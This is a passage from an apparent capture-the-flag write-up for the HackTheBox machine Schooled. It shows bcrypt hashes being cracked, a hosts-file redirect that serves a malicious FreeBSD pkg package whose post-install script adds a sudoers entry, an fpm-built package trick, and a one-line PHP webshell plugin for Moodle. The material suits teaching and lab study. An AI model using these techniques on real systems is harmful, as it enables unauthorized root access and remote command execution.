parker_tim89:$2y$10$YCYp8F91YdvY2QCg3Cl5r.jzYxMwkwEm/QBGYIs.apyeCeRD7OD6S
0xdf:$2y$10$AmKUmB1aYnZKMrj/LoaYeefybrcq8mBU0JmEGKiXoDJtj0EFZBjza

```

### Crack Hashes

Hashcat example hashes show these are bcrypt. Because cracking bcrypt hashes is so slow, and because each word has to be tested for each unique salt, I’m going to just test the admin account that has an email address of jamie@staff.schooled.htb. The [Hashcat example hashes](https://hashcat.net/wiki/doku.php?id=example_hashes) page shows these are mode 3200, so I’ll run `hashcat -m 3200 --user hash /usr/share/wordlists/rockyou.txt`. It cracks in a bout 15 minutes on a really low-powered VM:

```

$2y$10$3D/gznFHdpV6PXt1cLPhX.ViTgs87DCE5KqphQhGYR5GFbcl4qTiW:!QAZ2wsx

```

### SSH

The creds work to SSH in as jamie:

```

oxdf@parrot$ sshpass -p '!QAZ2wsx' ssh jamie@10.10.10.234
...[snip]...
jamie@Schooled:~ $

```

And gives access to `user.txt`:

```

jamie@Schooled:~ $ cat user.txt
997d334f************************

```

## Shell as root

### Enumeration

`sudo -l` shows that jamie can run two commands as root:

```

jamie@Schooled:~ $ sudo -l
User jamie may run the following commands on Schooled:
    (ALL) NOPASSWD: /usr/sbin/pkg update
    (ALL) NOPASSWD: /usr/sbin/pkg install *

```

### Takeover Update Server

Starting with the [man page for pkg](https://www.freebsd.org/cgi/man.cgi?query=pkg&sektion=&n=1), `pkg` has a ton of subcommands. jamie can only run two, `update` and `install`:

> ```

> install
>      Install a package from a remote package repository.  If a package
>      is	found in more than one remote repository, then installation
>      happens from the first one.  Downloading a	package	is tried from
>      each package repository in	turn, until the	package	is success-
>      fully fetched.
>      
> update  Update the	available remote repositories as listed	in
> 	 pkg.conf(5).
>
> ```

My first hope was that I could use the `pkg` command to install from a file like `dpkg` on Debian-based OSes, but both of these commands have to do with remote repositories, which makes that less likely.

The [man page for pkg.conf](https://www.freebsd.org/cgi/man.cgi?query=pkg.conf&sektion=5&apropos=0&manpath=FreeBSD+12.2-RELEASE+and+Ports) gives the location of that file, `/usr/local/etc/pkg.conf`. Looking at it, most of the lines start with `#`, indicating they are commented out. That’s typically used to show the default settings. This looks like it gives the directories where the remote repos are defined:

```

#REPOS_DIR [
#    "/etc/pkg/",
#    "/usr/local/etc/pkg/repos/",
#]

```

If I can write to either of these, I could add my own repo. Unfortunately, jamie can’t:

```

jamie@Schooled:~ $ touch test /etc/pkg/0xdf
touch: /etc/pkg/0xdf: Permission denied
jamie@Schooled:~ $ touch test /usr/local/etc/pkg/repos/0xdf
touch: /usr/local/etc/pkg/repos/0xdf: No such file or directory

```

The second one doesn’t exist. But there is a single repository defined in the first one:

```

jamie@Schooled:~ $ ls -l /etc/pkg/
total 5
-rw-r--r--  1 root  wheel  421 Mar  1 11:06 FreeBSD.conf

jamie@Schooled:~ $ cat /etc/pkg/FreeBSD.conf 
# $FreeBSD$
#
# To disable this repository, instead of modifying or removing this file,
# create a /usr/local/etc/pkg/repos/FreeBSD.conf file:
#
#   mkdir -p /usr/local/etc/pkg/repos
#   echo "FreeBSD: { enabled: no }" > /usr/local/etc/pkg/repos/FreeBSD.conf
#

FreeBSD: {
  url: "pkg+http://devops.htb:80/packages",
  mirror_type: "srv",
  signature_type: "none",
  fingerprints: "/usr/share/keys/pkg",
  enabled: yes
}

```

Only root can edit this file. So that rules out my changing it to point to my host as the server.

At this point, I know that jamie can run commands as root that will reach out to devops.htb and get updates. Interestingly, if I try to ping devops.htb, it resolves (though no pings succeed):

```

jamie@Schooled:~ $ ping -c2 devops.htb
PING devops.htb (192.168.1.14): 56 data bytes
--- devops.htb ping statistics ---
2 packets transmitted, 0 packets received, 100.0% packet loss

```

It resolved to 192.168.1.14 because it’s defined in the `/etc/hosts` file.

```

jamie@Schooled:~ $ grep -v "^#" /etc/hosts
::1                     localhost localhost.my.domain
127.0.0.1               localhost localhost.my.domain Schooled schooled.htb moodle.schooled.htb
192.168.1.14            devops.htb

```

More interesting, members of the wheel group can edit `/etc/hosts`, and jamie is in the wheel group:

```

jamie@Schooled:~ $ ls -l /etc/hosts
-rw-rw-r--  1 root  wheel  1098 Mar 17 15:47 /etc/hosts
jamie@Schooled:~ $ id
uid=1001(jamie) gid=1001(jamie) groups=1001(jamie),0(wheel)

```

I’ll update the IP to by mine, and run the `update` command with an HTTP server listening on my VM:

```

jamie@Schooled:~ $ sudo pkg update
Updating FreeBSD repository catalogue...
pkg: Repository FreeBSD has a wrong packagesite, need to re-create database
pkg: http://devops.htb/packages/meta.txz: Not Found
repository FreeBSD has no meta file, using default settings
pkg: http://devops.htb/packages/packagesite.txz: Not Found
Unable to update repository FreeBSD
Error updating repositories!

```

The server sees three requests (all 404):

```

oxdf@parrot$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.10.234 - - [06/Apr/2021 08:18:57] code 404, message File not found
10.10.10.234 - - [06/Apr/2021 08:18:57] "GET /packages/meta.conf HTTP/1.1" 404 -
10.10.10.234 - - [06/Apr/2021 08:18:57] code 404, message File not found
10.10.10.234 - - [06/Apr/2021 08:18:57] "GET /packages/meta.txz HTTP/1.1" 404 -
10.10.10.234 - - [06/Apr/2021 08:18:58] code 404, message File not found
10.10.10.234 - - [06/Apr/2021 08:18:58] "GET /packages/packagesite.txz HTTP/1.1" 404 -

```

Similarly, the `install` command will contact me as well, requesting the same three files:

```

jamie@Schooled:~ $ sudo pkg install pwned
Updating FreeBSD repository catalogue...
pkg: http://devops.htb/packages/meta.txz: Not Found
repository FreeBSD has no meta file, using default settings
pkg: http://devops.htb/packages/packagesite.txz: Not Found
Unable to update repository FreeBSD
Error updating repositories!

```

These files tell the client (Schooled) about the packages that the server is hosting, versions, etc.

### Generate Package

#### Overview

Now that I can make Schooled contact my VM requesting updates / packages, I will make a malicious package that will enable root access. There’s an entire chapter [in the FreeBSD docs](https://docs.freebsd.org/en_US.ISO8859-1/books/porters-handbook/own-port.html) about making a new Port (what FreeBSD calls a package). [This post](http://lastsummer.de/creating-custom-packages-on-freebsd/) gives a simpler path to creating a package. In a staging directory, I’m going to create a few files:
- `+POST_INSTALL` - This is the file that will run on install.
- `+MANIFEST` - Metadata about the package.
- `usr/local/etc/my.conf` - This is a fake conf file that will be dropped into place on the installing system.
- `plist` - Information about that conf file.

Then I need to run some `pkg` commands to create the package and the repo files. `pkg create` (doesn’t need to be run as root) will create a package archive file. `pkg repo` will:

> ```

> Create a local package repository for remote usage.
>
> ```

In practice this creates the metadata files that Schooled was requesting when it ran `pkg update` and `pkg install`.

Because I need access to `pkg`, I could create a FreeBSD VM, or I could just work from a staging directory on Schoool. I’ll do the latter.

#### Generate Package

I’ll create a staging directory to work from:

```

jamie@Schooled:/var/tmp $ mkdir .0xdf

```

I tried a couple ways to get a shell as root, but the one that ultimately ended up working was to write to the `sudoers` file:

```

jamie@Schooled:/var/tmp/.0xdf $ cat > +POST_INSTALL <<EOF
> echo "jamie ALL=(ALL) NOPASSWD: ALL" >> /usr/local/etc/sudoers
> EOF

```

Next the manifest file, using the template from the blog post (many of these fields are probably not necessary):

```

jamie@Schooled:/var/tmp/.0xdf $ cat > +MANIFEST <<EOF
name: "0xdf"
version: "1.0_5"
origin: sysutils/0xdf
comment: "0xdf was here"
desc: "moar root plz"
maintainer: 0xdf@schooled.htb
www: https://0xdf.gitlab.io
prefix: /
EOF

```

Create the config file and `plist`:

```

jamie@Schooled:/var/tmp/.0xdf $ mkdir -p usr/local/etc
jamie@Schooled:/var/tmp/.0xdf $ echo "# nothing to see here" > usr/local/etc/0xdf.conf
jamie@Schooled:/var/tmp/.0xdf $ echo "/usr/local/etc/0xdf.conf" > plist

```

Now I’ll create the package with `pkg create` which generates `0xdf-root-1.0_5.txz`:

```

jamie@Schooled:/var/tmp/.0xdf $ pkg create -m /var/tmp/.0xdf/ -r /var/tmp/.0xdf/ -p /var/tmp/.0xdf/plist -o .
jamie@Schooled:/var/tmp/.0xdf $ ls
+MANIFEST       +POST_INSTALL   0xdf-1.0_5.txz  plist           usr

```

#### Generate Repo Metadata

`pkg repo` will generate the repo metadata files:

```

jamie@Schooled:/var/tmp/.0xdf $ pkg repo .
Creating repository in .: 100%
Packing files for repository: 100%
jamie@Schooled:/var/tmp/.0xdf $ ls
+MANIFEST       +POST_INSTALL   0xdf-1.0_5.txz  meta.conf       meta.txz        packagesite.txz plist           usr

```

### Host Package

I’m going to have Schooled update from my VM, so I need to get these files back to my host, and put them into `/packages` on a webserver. I’ll use `scp`:

```

oxdf@parrot$ sshpass -p '!QAZ2wsx' scp jamie@10.10.10.234:/var/tmp/.0xdf/packagesite.txz packages
oxdf@parrot$ sshpass -p '!QAZ2wsx' scp jamie@10.10.10.234:/var/tmp/.0xdf/meta.* packages
oxdf@parrot$ sshpass -p '!QAZ2wsx' scp jamie@10.10.10.234:/var/tmp/.0xdf/0xdf-1.0_5.txz packages
oxdf@parrot$ find packages/
packages/
packages/meta.txz
packages/packagesite.txz
packages/meta.conf
packages/0xdf-1.0_5.txz

```

In that directory, `python3 -m http.server 80` will host the files.

### Exploit

I’ll re-update `/etc/hosts` with my IP (there’s a cron resetting it frequently), and run `pkg update`:

```

jamie@Schooled:/var/tmp/.0xdf-staging $ sudo pkg update
Updating FreeBSD repository catalogue...
Fetching meta.conf: 100%    163 B   0.2kB/s    00:01    
Fetching packagesite.txz: 100%    460 B   0.5kB/s    00:01    
Processing entries: 100%
FreeBSD repository update completed. 1 packages processed.
All repositories are up to date.

```

The requests at my server look good:

```

oxdf@parrot$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.10.234 - - [06/Apr/2021 09:03:28] "GET /packages/meta.conf HTTP/1.1" 200 -
10.10.10.234 - - [06/Apr/2021 09:03:28] "GET /packages/packagesite.txz HTTP/1.1" 200 -

```

Next I’ll install my package:

```

jamie@Schooled:/var/tmp/.0xdf $ sudo pkg install 0xdf 
Updating FreeBSD repository catalogue...
Fetching meta.conf: 100%    163 B   0.2kB/s    00:01    
FreeBSD repository is up to date.
All repositories are up to date.
The following 1 package(s) will be affected (of 0 checked):

New packages to be INSTALLED:
        0xdf: 1.0_5

Number of packages to be installed: 1

572 B to be downloaded.

Proceed with this action? [y/N]: Y
[1/1] Fetching 0xdf-1.0_5.txz: 100%    572 B   0.6kB/s    00:01    
Checking integrity... done (0 conflicting)
[1/1] Installing 0xdf-1.0_5...
[1/1] Extracting 0xdf-1.0_5: 100%

```

All looks good there. At the webserver, it requests `meta.conf` and `packagesite.txz` (both of which return 304 Not Modified), and then the package:

```
10.10.10.234 - - [06/Apr/2021 09:04:49] "GET /packages/meta.conf HTTP/1.1" 304 -
10.10.10.234 - - [06/Apr/2021 09:04:49] "GET /packages/packagesite.txz HTTP/1.1" 304 -
10.10.10.234 - - [06/Apr/2021 09:04:54] "GET /packages/0xdf-1.0_5.txz HTTP/1.1" 200 -

```

### Shell

More importantly, it worked:

```

jamie@Schooled:/var/tmp/.0xdf $ sudo -l
User jamie may run the following commands on Schooled:
    (ALL) NOPASSWD: /usr/sbin/pkg update
    (ALL) NOPASSWD: /usr/sbin/pkg install *
    (ALL) NOPASSWD: ALL

```

`sudo su` will provide a root shell:

```

jamie@Schooled:~ $ sudo su
root@Schooled:/usr/home/jamie #

```

And `root.txt`:

```

root@Schooled:~ # cat root.txt
e65bc368************************

```

### Alternative GTFOBins

When Schooled released, I don’t believe `pkg` was on GTFOBins, but it is [now](https://gtfobins.github.io/gtfobins/pkg/). It uses `fpm` to generate a dummy package. [fpm](https://github.com/jordansissel/fpm) is a tool for building packages for various OSes. That binary isn’t on Schooled:

```

jamie@Schooled:/tmp $ which fpm
jamie@Schooled:/tmp $ find / -name fpm -type f 2>/dev/null

```

I’ll install it on my VM with `sudo gem i fpm -f`, and build that package there with the commands from GTFOBins, which results in a `txz` file in the current directory:

```

oxdf@parrot$ TF=$(mktemp -d)
oxdf@parrot$ echo 'id' > $TF/x.sh
oxdf@parrot$ fpm -n x -s dir -t freebsd -a all --before-install $TF/x.sh $TF
Created package {:path=>"x-1.0.txz"}
oxdf@parrot$ file x-1.0.txz
x-1.0.txz: XZ compressed data

```

I’ll use `scp` to upload that to Schooled:

```

oxdf@parrot$ sshpass -p '!QAZ2wsx' scp x-1.0.txz jamie@10.10.10.234:/tmp/

```

And from Schooled run the command given:

```

jamie@Schooled:/tmp $ sudo pkg install -y --no-repo-update ./x-1.0.txz 
pkg: Repository FreeBSD has a wrong packagesite, need to re-create database
pkg: Repository FreeBSD cannot be opened. 'pkg update' required
Checking integrity... done (0 conflicting)
The following 1 package(s) will be affected (of 0 checked):

New packages to be INSTALLED:                               
        x: 1.0                                              

Number of packages to be installed: 1       
[1/1] Installing x-1.0...
uid=0(root) gid=0(wheel) groups=0(wheel),5(operator)
Extracting x-1.0:   0%
pkg: File //tmp/tmp.E9AA2kxeLQ/x.sh not specified in the manifest
Extracting x-1.0: 100% 

```

There’s a bunch in there, but four lines from the bottom is the output of `id` showing root. From there I can get a shell any number of ways.

## Beyond Root

I used a malicious Moodle plugin to get execution on Schooled. Rather than make one, I downloaded one from [this GitHub](https://github.com/HoangKien1020/Moodle_RCE). I uploaded the plugin, and then triggered the webshell at:

```

http://moodle.schooled.htb/moodle/blocks/rce/lang/en/block_rce.php?cmd=id

```

So what is it?

The file is `rce.zip`, and it is a zip archive that contains two files with some directories:

```

oxdf@parrot$ file rce.zip 
rce.zip: Zip archive data, at least v1.0 to extract
oxdf@parrot$ unzip -l rce.zip 
Archive:  rce.zip
  Length      Date    Time    Name
---------  ---------- -----   ----
        0  2020-06-17 11:23   rce/
        0  2020-06-17 09:52   rce/lang/
        0  2020-06-17 13:43   rce/lang/en/
       30  2020-06-17 11:31   rce/lang/en/block_rce.php
       73  2020-06-17 13:43   rce/version.php
---------                     -------
      103                     5 files

```

`version.php` gives some metadata about the “plugin”:

```

<?php 
$plugin->version = 2020061700;
$plugin->component = 'block_rce';

```

`block_rce.php` is a simple webshell:

```

<?php system($_GET['cmd']); ?>

```

Moodle must unpack the plugin into the `/blocks/` directory, where I can then access it.